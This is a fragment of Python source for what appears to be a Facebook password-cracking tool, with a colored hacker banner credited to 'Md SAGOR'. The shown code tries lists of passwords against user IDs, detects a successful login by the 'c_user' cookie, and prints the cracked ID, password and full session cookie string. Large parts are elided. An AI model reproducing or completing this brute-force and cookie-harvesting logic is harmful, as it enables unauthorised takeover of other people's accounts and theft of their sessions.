...
\033[1;32m[-] AUTH    :\033[1;32m Md SAGR
\033[1;32m[-] GITHUB    :\033[1;32m  MR-SAGOR-Cyber-BD
\033[1;32m[-] FACEBOOK  :\033[1;32m Md SAGOR
\033[1;92m══════════════════════════════════════════
\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS SAGOR\033[;0m\033[1;91m═══>\033[1;92m"""
linex=('\033[1;31m--------------------------------------------------------')
class Main:
    def __init__(self):
        self.id = []
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[38;5;46m[SAGOR-OK💚] {uid}|{ps}\n\033[1;33m[COOKIE🎁] \033[1;33m{coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
               # print(f"\x1b[38;5;196m[SAGOR-CP💔] {uid}|{ps}")
